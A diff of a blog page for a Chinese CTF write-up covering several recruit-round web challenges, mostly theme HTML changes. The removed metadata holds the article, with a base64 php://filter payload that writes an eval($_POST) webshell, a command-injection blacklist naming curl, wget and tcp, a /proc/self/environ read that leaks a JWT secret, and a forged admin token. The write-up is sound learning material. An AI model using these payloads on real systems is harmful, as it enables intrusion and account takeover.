@@ -1,364 +1,752 @@
-<!doctype html><html lang=en dir=auto>
-<head><meta charset=utf-8>
-<meta http-equiv=x-ua-compatible content="IE=edge">
-<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
-<meta name=robots content="index, follow">
-<title>CNSS Recruit-Web Write UP | Console.makeHappy(_1ming)</title>
-<meta name=keywords content="CTF,WriteUP,Note">
-<meta name=description content="前言 躺在床上，不想动鼠标，那就先写写前言吧。
-这个CTF比赛是我打的第二场比较正规、完整的比赛。
-惨不忍睹，当然，作为刚入门的noob来说也可以接受。
-希望能通过笔记的整理消化新掌握的知识，道阻且长。
-[👶Baby]GitHacker 根据题目名，应该是考察Git泄露相关知识。
-关于工具Githack的使用和Python2/3的同时安装 使用工具Githack下载网站/.git下所有内容，注意Githack脚本使用python2编写，两个版本共存的方法是，在正常安装Python3的基础上，再安装Python2，将目录添加至环境变量后，将执行文件名修改为python2.exe，则在pws中输入python是运行python3，输入python2则是运行Python2.
-python2 .\GitHack.py http:\\x.x.x\.git 运行后即得到git目录。
-Git版本管理 这个地方困扰我很久，但也因此学到了很多之前一直想学但没机会的Git使用方式。
-git log # 查看提交记录（版本号） git status # 查看本地修改记录 git reset --hard 目标版本号 # 退回目标版本号 git reset HEAD # 回退到最早版本 git checkout # 还原与版本记录不符的所有文件 git restore 目标文件名 # 还原与版本记录不符的目标文件 这道题只需要回退到最早版本并checkout，即可得到未修改过的index.html，flag以CNSS{XXX}的形式隐藏在源代码中，注意，要搜CNSS而不是flag。
-其他Githack脚本 在CTF中推荐Git_Extract-master这个脚本，可以在下载目录的同时，恢复所有文件版本，省去了git reset和git checkout的过程。
-[😃Easy]更坑的数学题 仅有的提示就是快速把结果提交，有可能会出现flag。
-第一反应是绕过和注入咯，尝试后无果。
-再观察续一秒按钮前端代码，发现是安慰剂按钮。。。
-那就只有在1s内做出答案了，算是个Brute Force吧，下面是丁佬的python代码：
-import requests import re # 正则表达式库 import string from requests.sessions import session url = 'http://81.68.109.40:30005/' session = requests.">
-<meta name=author content="Yiming Shen">
-<link rel=canonical href=https://shenyimings.github.io/post/14.cnss-recruit-web-write-up/>
-<meta name=google-site-verification content="XYZabc">
-<meta name=yandex-verification content="XYZabc">
-<meta name=msvalidate.01 content="XYZabc">
-<link href=/assets/css/stylesheet.min.746a86b58bb2b052b5e4df8216510494f04f81e62c08d626150c26c69ca929da.css integrity="sha256-dGqGtYuysFK15N+CFlEElPBPgeYsCNYmFQwmxpypKdo=" rel="preload stylesheet" as=style>
-<link rel=icon href=https://shenyimings.github.io/favicon.ico>
-<link rel=icon type=image/png sizes=16x16 href=https://shenyimings.github.io/favicon-16x16.png>
-<link rel=icon type=image/png sizes=32x32 href=https://shenyimings.github.io/favicon-32x32.png>
-<link rel=apple-touch-icon href=https://shenyimings.github.io/apple-touch-icon.png>
-<link rel=mask-icon href=https://shenyimings.github.io/safari-pinned-tab.svg>
-<meta name=theme-color content="#2e2e33">
-<meta name=msapplication-TileColor content="#2e2e33">
-<meta name=generator content="Hugo 0.90.1">
-<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css integrity=sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X crossorigin=anonymous>
-<script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js integrity=sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4 crossorigin=anonymous></script>
-<script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js integrity=sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa crossorigin=anonymous onload=renderMathInElement(document.body)></script>
-<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-123-45','auto'),ga('send','pageview'))</script>
-<script async src=https://www.google-analytics.com/analytics.js></script>
-<meta property="og:title" content="CNSS Recruit-Web Write UP">
-<meta property="og:description" content="前言 躺在床上，不想动鼠标，那就先写写前言吧。
-这个CTF比赛是我打的第二场比较正规、完整的比赛。
-惨不忍睹，当然，作为刚入门的noob来说也可以接受。
-希望能通过笔记的整理消化新掌握的知识，道阻且长。
-[👶Baby]GitHacker 根据题目名，应该是考察Git泄露相关知识。
-关于工具Githack的使用和Python2/3的同时安装 使用工具Githack下载网站/.git下所有内容，注意Githack脚本使用python2编写，两个版本共存的方法是，在正常安装Python3的基础上，再安装Python2，将目录添加至环境变量后，将执行文件名修改为python2.exe，则在pws中输入python是运行python3，输入python2则是运行Python2.
-python2 .\GitHack.py http:\\x.x.x\.git 运行后即得到git目录。
-Git版本管理 这个地方困扰我很久，但也因此学到了很多之前一直想学但没机会的Git使用方式。
-git log # 查看提交记录（版本号） git status # 查看本地修改记录 git reset --hard 目标版本号 # 退回目标版本号 git reset HEAD # 回退到最早版本 git checkout # 还原与版本记录不符的所有文件 git restore 目标文件名 # 还原与版本记录不符的目标文件 这道题只需要回退到最早版本并checkout，即可得到未修改过的index.html，flag以CNSS{XXX}的形式隐藏在源代码中，注意，要搜CNSS而不是flag。
-其他Githack脚本 在CTF中推荐Git_Extract-master这个脚本，可以在下载目录的同时，恢复所有文件版本，省去了git reset和git checkout的过程。
-[😃Easy]更坑的数学题 仅有的提示就是快速把结果提交，有可能会出现flag。
-第一反应是绕过和注入咯，尝试后无果。
-再观察续一秒按钮前端代码，发现是安慰剂按钮。。。
-那就只有在1s内做出答案了，算是个Brute Force吧，下面是丁佬的python代码：
-import requests import re # 正则表达式库 import string from requests.sessions import session url = 'http://81.68.109.40:30005/' session = requests.">
-<meta property="og:type" content="article">
-<meta property="og:url" content="https://shenyimings.github.io/post/14.cnss-recruit-web-write-up/"><meta property="og:image" content="https://shenyimings.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="post">
-<meta property="article:published_time" content="2021-10-21T00:00:00+00:00">
-<meta property="article:modified_time" content="2021-10-22T00:00:00+00:00"><meta property="og:site_name" content="Yiming">
-<meta name=twitter:card content="summary_large_image">
-<meta name=twitter:image content="https://shenyimings.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E">
-<meta name=twitter:title content="CNSS Recruit-Web Write UP">
-<meta name=twitter:description content="前言 躺在床上，不想动鼠标，那就先写写前言吧。
-这个CTF比赛是我打的第二场比较正规、完整的比赛。
-惨不忍睹，当然，作为刚入门的noob来说也可以接受。
-希望能通过笔记的整理消化新掌握的知识，道阻且长。
-[👶Baby]GitHacker 根据题目名，应该是考察Git泄露相关知识。
-关于工具Githack的使用和Python2/3的同时安装 使用工具Githack下载网站/.git下所有内容，注意Githack脚本使用python2编写，两个版本共存的方法是，在正常安装Python3的基础上，再安装Python2，将目录添加至环境变量后，将执行文件名修改为python2.exe，则在pws中输入python是运行python3，输入python2则是运行Python2.
-python2 .\GitHack.py http:\\x.x.x\.git 运行后即得到git目录。
-Git版本管理 这个地方困扰我很久，但也因此学到了很多之前一直想学但没机会的Git使用方式。
-git log # 查看提交记录（版本号） git status # 查看本地修改记录 git reset --hard 目标版本号 # 退回目标版本号 git reset HEAD # 回退到最早版本 git checkout # 还原与版本记录不符的所有文件 git restore 目标文件名 # 还原与版本记录不符的目标文件 这道题只需要回退到最早版本并checkout，即可得到未修改过的index.html，flag以CNSS{XXX}的形式隐藏在源代码中，注意，要搜CNSS而不是flag。
-其他Githack脚本 在CTF中推荐Git_Extract-master这个脚本，可以在下载目录的同时，恢复所有文件版本，省去了git reset和git checkout的过程。
-[😃Easy]更坑的数学题 仅有的提示就是快速把结果提交，有可能会出现flag。
-第一反应是绕过和注入咯，尝试后无果。
-再观察续一秒按钮前端代码，发现是安慰剂按钮。。。
-那就只有在1s内做出答案了，算是个Brute Force吧，下面是丁佬的python代码：
-import requests import re # 正则表达式库 import string from requests.sessions import session url = 'http://81.68.109.40:30005/' session = requests.">
-<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://shenyimings.github.io/post/"},{"@type":"ListItem","position":2,"name":"CNSS Recruit-Web Write UP","item":"https://shenyimings.github.io/post/14.cnss-recruit-web-write-up/"}]}</script>
-<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"CNSS Recruit-Web Write UP","name":"CNSS Recruit-Web Write UP","description":"前言 躺在床上，不想动鼠标，那就先写写前言吧。\n这个CTF比赛是我打的第二场比较正规、完整的比赛。\n惨不忍睹，当然，作为刚入门的noob来说也可以接受。\n希望能通过笔记的整理消化新掌握的知识，道阻且长。\n[👶Baby]GitHacker 根据题目名，应该是考察Git泄露相关知识。\n关于工具Githack的使用和Python2/3的同时安装 使用工具Githack下载网站/.git下所有内容，注意Githack脚本使用python2编写，两个版本共存的方法是，在正常安装Python3的基础上，再安装Python2，将目录添加至环境变量后，将执行文件名修改为python2.exe，则在pws中输入python是运行python3，输入python2则是运行Python2.\npython2 .\\GitHack.py http:\\\\x.x.x\\.git 运行后即得到git目录。\nGit版本管理 这个地方困扰我很久，但也因此学到了很多之前一直想学但没机会的Git使用方式。\ngit log # 查看提交记录（版本号） git status # 查看本地修改记录 git reset --hard 目标版本号 # 退回目标版本号 git reset HEAD # 回退到最早版本 git checkout # 还原与版本记录不符的所有文件 git restore 目标文件名 # 还原与版本记录不符的目标文件 这道题只需要回退到最早版本并checkout，即可得到未修改过的index.html，flag以CNSS{XXX}的形式隐藏在源代码中，注意，要搜CNSS而不是flag。\n其他Githack脚本 在CTF中推荐Git_Extract-master这个脚本，可以在下载目录的同时，恢复所有文件版本，省去了git reset和git checkout的过程。\n[😃Easy]更坑的数学题 仅有的提示就是快速把结果提交，有可能会出现flag。\n第一反应是绕过和注入咯，尝试后无果。\n再观察续一秒按钮前端代码，发现是安慰剂按钮。。。\n那就只有在1s内做出答案了，算是个Brute Force吧，下面是丁佬的python代码：\nimport requests import re # 正则表达式库 import string from requests.sessions import session url = \u0026#39;http://81.68.109.40:30005/\u0026#39; session = requests.","keywords":["CTF","WriteUP","Note"],"articleBody":"前言 躺在床上，不想动鼠标，那就先写写前言吧。\n这个CTF比赛是我打的第二场比较正规、完整的比赛。\n惨不忍睹，当然，作为刚入门的noob来说也可以接受。\n希望能通过笔记的整理消化新掌握的知识，道阻且长。\n[👶Baby]GitHacker 根据题目名，应该是考察Git泄露相关知识。\n关于工具Githack的使用和Python2/3的同时安装 使用工具Githack下载网站/.git下所有内容，注意Githack脚本使用python2编写，两个版本共存的方法是，在正常安装Python3的基础上，再安装Python2，将目录添加至环境变量后，将执行文件名修改为python2.exe，则在pws中输入python是运行python3，输入python2则是运行Python2.\npython2 .\\GitHack.py http:\\\\x.x.x\\.git 运行后即得到git目录。\nGit版本管理 这个地方困扰我很久，但也因此学到了很多之前一直想学但没机会的Git使用方式。\ngit log # 查看提交记录（版本号） git status # 查看本地修改记录 git reset --hard 目标版本号 # 退回目标版本号 git reset HEAD # 回退到最早版本 git checkout # 还原与版本记录不符的所有文件 git restore 目标文件名 # 还原与版本记录不符的目标文件 这道题只需要回退到最早版本并checkout，即可得到未修改过的index.html，flag以CNSS{XXX}的形式隐藏在源代码中，注意，要搜CNSS而不是flag。\n其他Githack脚本 在CTF中推荐Git_Extract-master这个脚本，可以在下载目录的同时，恢复所有文件版本，省去了git reset和git checkout的过程。\n[😃Easy]更坑的数学题 仅有的提示就是快速把结果提交，有可能会出现flag。\n第一反应是绕过和注入咯，尝试后无果。\n再观察续一秒按钮前端代码，发现是安慰剂按钮。。。\n那就只有在1s内做出答案了，算是个Brute Force吧，下面是丁佬的python代码：\nimport requests import re # 正则表达式库 import string from requests.sessions import session url = 'http://81.68.109.40:30005/' session = requests.session() # 保持会话 req = session.get(url=url) # 导入URL，创建会话，结果存储在req中 prog = re.compile('\\d{8}') # 初始化正则表达式为匹配连续出现8次的数字 group = prog.findall(req.text) # 将结果存入数组 sum = int (group[0])*int(group[1]) # 计算结果 str=str(sum) data={ 'res':str } # 构建post的payload r=session.post(url=url,data=data) # 发送post请求，返回内容存入r中 print(r.text) 这又是一个利用python做题的重要例子，对于python的学习应用要加强，应当抽时间写爬虫实战以练习。\n[😮Mid]太极掌门人 网页给出代码如下：\nphp error_reporting(0); show_source(__FILE__); function deleteDir($path) { if (is_dir($path)) { $dirs = scandir($path); foreach ($dirs as $dir) { if ($dir != '.' \u0026\u0026 $dir != '..') { $sonDir = $path.'/'.$dir; if (is_dir($sonDir)) { deleteDir($sonDir); @rmdir($sonDir); } elseif ($sonDir !== './index.php' \u0026\u0026 $sonDir !== './flag.php') { @unlink($sonDir); } } } @rmdir($path); } } $devil = ''; $goods = $_POST['goods']; file_put_contents($_POST['train'], $devil . $goods); sleep(1); deleteDir('.'); ?关键代码：file_put_contents写入文件，妥妥的文件上传漏洞。\n我们构造命令以绕过exit函数，具体参考13.RCE专栏。\n?train=php://filter/convert.base64-decode/resource=1.php\u0026goods=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw== 此时PHP执行的命令为：\nfile_put_contents(\"php://filter/convert.base64-decode/resource=1.php\", ''.\"aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==\"); 我们在PHP中运行一下，发现成功在目录下写入了有命令执行的PHP脚本。\n由于这是一个静态靶机，为了减轻服务器负担，故而有删除目录命令的存在，定时清空网站根目录，因此我们要在清空之前连入shell脚本，读取flag.php文件内容，拿到flag。\n[😮Mid]BlackPage 查看源代码，发现hint：查看myblackdoor.php\nphp error_reporting(0); function blacklist($cmd){ $filter = \"(\\\\\\\\|Fl4g|php|curl| |0x|\\\\\\\\|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|×|flag|ph|hp|wget|type|ty|\\\\$\\\\{IFS\\\\}|index|\\\\*)\"; if (preg_match(\"/\".$filter.\"/is\",$cmd)==1){ exit('Go out! This black page does not belong to you!'); } else{ system($cmd); } } blacklist($_GET['cmd']); ?[😮Mid]To_be_Admin 页面左下角有/read字样，打开后提示用get参数传入file即可读取指定文件：\n![image-20211022101753988](14.CNSS Recruit-Web Write UP.assets/image-20211022101753988.png)\n尝试后，未发现注入点，直接读取flag.php显示禁止访问，未找到过滤方法。\n我们用burp抓包后发现，网站的cookie可以被读取查看：\n应用base64解码后发现文本可读，搜索JWT发现这是一种验证算法。\n Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。\n 在JWT.io中可以对其进行详细编辑。jwt分为三部分，头部(header)，载荷(payload)，签名(signature)，签名是根据头部和载荷，加上密钥(key)后按照指定算法生成，如此JWT使用HS256算法。\n在不知道密钥的情况下，我们可以使用JWT cracker暴力破解，我使用java版cracker CPU占用率100%跑了一中午并未出结果，毕竟几率渺茫。\n正确方法应当是找到网站中隐藏的key。\n我们了解一下proc文件系统：\n 通过/proc/$pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。\n 由于此网站后端是用python写的，在生成token时调用的密钥必然存在系统中，我们要做的就是找到并查看系统环境变量：\n?file=/proc/self/environ # prco是进程目录（linux进程以文件形式存放），self是当前运行进程，environ是环境变量 ![image-20211022110601481](14.CNSS Recruit-Web Write UP.assets/image-20211022110601481.png)\n在第一行发现密钥KEY：nWMfdan2349r*fn9dMz\n这……怎么可能暴力碰出来呢。\n进入jwt.io，修改username=admin，用该密钥生成新的jwt，传入token，放包\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IkFkbWluIn0.1kMTURzATts34snMro5E2MvNRM46lY0S1Ez4iSmp2_s\r拿到flag。\n参考 [1] 正则表达式语法-RUNNOOB\n[2] Git恢复本地被误删文件\n[3] Proc文件系统详解\n","wordCount":"251","inLanguage":"en","datePublished":"2021-10-21T00:00:00Z","dateModified":"2021-10-22T00:00:00Z","author":{"@type":"Person","name":"Yiming Shen"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://shenyimings.github.io/post/14.cnss-recruit-web-write-up/"},"publisher":{"@type":"Organization","name":"Console.makeHappy(_1ming)","logo":{"@type":"ImageObject","url":"https://shenyimings.github.io/favicon.ico"}}}</script>
+<!DOCTYPE html>
+<html lang="zh" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>CNSS Recruit-Web Write UP - Hi, Yiming</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="Yiming Shen" />
+  <meta name="description" content="前言 躺在床上，不想动鼠标，那就先写写前言吧。 这个CTF比赛是我打的第二场比较正规、完整的比赛。 惨不忍睹，当然，作为刚入门的noob来说也可以" />
+
+  <meta name="keywords" content="Photographer, CTFer, lazyGeek" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.91.0" />
+
+
+<link rel="canonical" href="https://shenyimings.github.io/post/14.cnss-recruit-web-write-up/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.b3a8813c06e6d785beba22bf8264e174fa2cb3a396b22f9ba24e2c00c18aaf7f.css" integrity="sha256-s6iBPAbm14W&#43;uiK/gmThdPoss6OWsi&#43;bok4sAMGKr38=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="CNSS Recruit-Web Write UP" />
+<meta property="og:description" content="前言 躺在床上，不想动鼠标，那就先写写前言吧。 这个CTF比赛是我打的第二场比较正规、完整的比赛。 惨不忍睹，当然，作为刚入门的noob来说也可以" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://shenyimings.github.io/post/14.cnss-recruit-web-write-up/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2021-10-21T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-10-22T00:00:00+00:00" />
+
+<meta itemprop="name" content="CNSS Recruit-Web Write UP">
+<meta itemprop="description" content="前言 躺在床上，不想动鼠标，那就先写写前言吧。 这个CTF比赛是我打的第二场比较正规、完整的比赛。 惨不忍睹，当然，作为刚入门的noob来说也可以"><meta itemprop="datePublished" content="2021-10-21T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2021-10-22T00:00:00+00:00" />
+<meta itemprop="wordCount" content="2538">
+<meta itemprop="keywords" content="CTF,WriteUP,Note," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CNSS Recruit-Web Write UP"/>
+<meta name="twitter:description" content="前言 躺在床上，不想动鼠标，那就先写写前言吧。 这个CTF比赛是我打的第二场比较正规、完整的比赛。 惨不忍睹，当然，作为刚入门的noob来说也可以"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
 </head>
-<body id=top>
-<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
-<noscript>
-<style type=text/css>#theme-toggle,.top-link{display:none}</style>
-<style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
-</noscript>
-<header class=header>
-<nav class=nav>
-<div class=logo>
-<a href=https://shenyimings.github.io/ accesskey=h title="> 相位  (Alt + H)">
-<img src=/apple-touch-icon.png alt=logo aria-label=logo height=35>> 相位 </a>
-<span class=logo-switches>
-<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
-</button>
-</span>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Yiming</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
 </div>
-<ul id=menu onscroll=menu_on_scroll()>
-<li>
-<a href=https://shenyimings.github.io/archive/ title=归档>
-<span>归档</span>
-</a>
-</li>
-<li>
-<a href=https://shenyimings.github.io/categories/ title=分类>
-<span>分类</span>
-</a>
-</li>
-<li>
-<a href=https://shenyimings.github.io/tags/ title=标签>
-<span>标签</span>
-</a>
-</li>
-<li>
-<a href=https://shenyimings.github.io/search/ title="搜索 (Alt + /)" accesskey=/>
-<span>搜索</span>
-</a>
-</li>
-<li>
-<a href=https://shenyimings.github.io/about/ title=关于>
-<span>关于</span>
-</a>
-</li></ul>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://shenyimings.github.io/">Home</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://shenyimings.github.io/post/">Archives</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://shenyimings.github.io/tags/">Tags</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://shenyimings.github.io/categories/">Categories</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://shenyimings.github.io/about/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
 </nav>
-</header>
-<main class=main>
-<article class=post-single>
-<header class=post-header>
-<div class=breadcrumbs>
-<a href=https://shenyimings.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://shenyimings.github.io/post/>Posts</a>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
 </div>
-<h1 class=post-title>
-CNSS Recruit-Web Write UP
-</h1>
-<div class=post-meta>
-October 21, 2021&nbsp;·&nbsp;2 min&nbsp;·&nbsp;Yiming Shen
-|&nbsp;<a href=https://github.com/shenyimings/shenyimings.github.io/tree/main/docs rel="noopener noreferrer" target=_blank>Issue</a>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Yiming
+    
+  </a>
 </div>
-</header>
-<div class=post-content>
-<h2 id=前言>前言<a hidden class=anchor aria-hidden=true href=#前言>#</a></h2>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://shenyimings.github.io/">Home</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://shenyimings.github.io/post/">Archives</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://shenyimings.github.io/tags/">Tags</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://shenyimings.github.io/categories/">Categories</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://shenyimings.github.io/about/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">CNSS Recruit-Web Write UP</h1>
+      
+      <div class="post-meta">
+        <time datetime="2021-10-21" class="post-time">
+          2021-10-21
+        </time>
+        <div class="post-category">
+            <a href="https://shenyimings.github.io/categories/notes/"> Notes </a>
+            <a href="https://shenyimings.github.io/categories/ctf/"> CTF </a>
+            
+          </div>
+        
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Table of Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#babygithacker">[👶Baby]GitHacker</a>
+      <ul>
+        <li><a href="#关于工具githack的使用和python23的同时安装">关于工具Githack的使用和Python2/3的同时安装</a></li>
+        <li><a href="#git版本管理">Git版本管理</a></li>
+        <li><a href="#其他githack脚本">其他Githack脚本</a></li>
+      </ul>
+    </li>
+    <li><a href="#easy更坑的数学题">[😃Easy]更坑的数学题</a></li>
+    <li><a href="#mid太极掌门人">[😮Mid]太极掌门人</a></li>
+    <li><a href="#midblackpage">[😮Mid]BlackPage</a></li>
+    <li><a href="#midto_be_admin">[😮Mid]To_be_Admin</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      <h2 id="前言">前言</h2>
 <p>躺在床上，不想动鼠标，那就先写写前言吧。</p>
 <p>这个CTF比赛是我打的第二场比较正规、完整的比赛。</p>
 <p>惨不忍睹，当然，作为刚入门的noob来说也可以接受。</p>
 <p>希望能通过笔记的整理消化新掌握的知识，道阻且长。</p>
-<h2 id=babygithacker>[👶Baby]GitHacker<a hidden class=anchor aria-hidden=true href=#babygithacker>#</a></h2>
+<h2 id="babygithacker">[👶Baby]GitHacker</h2>
 <p>根据题目名，应该是考察Git泄露相关知识。</p>
-<h3 id=关于工具githack的使用和python23的同时安装>关于工具Githack的使用和Python2/3的同时安装<a hidden class=anchor aria-hidden=true href=#关于工具githack的使用和python23的同时安装>#</a></h3>
+<h3 id="关于工具githack的使用和python23的同时安装">关于工具Githack的使用和Python2/3的同时安装</h3>
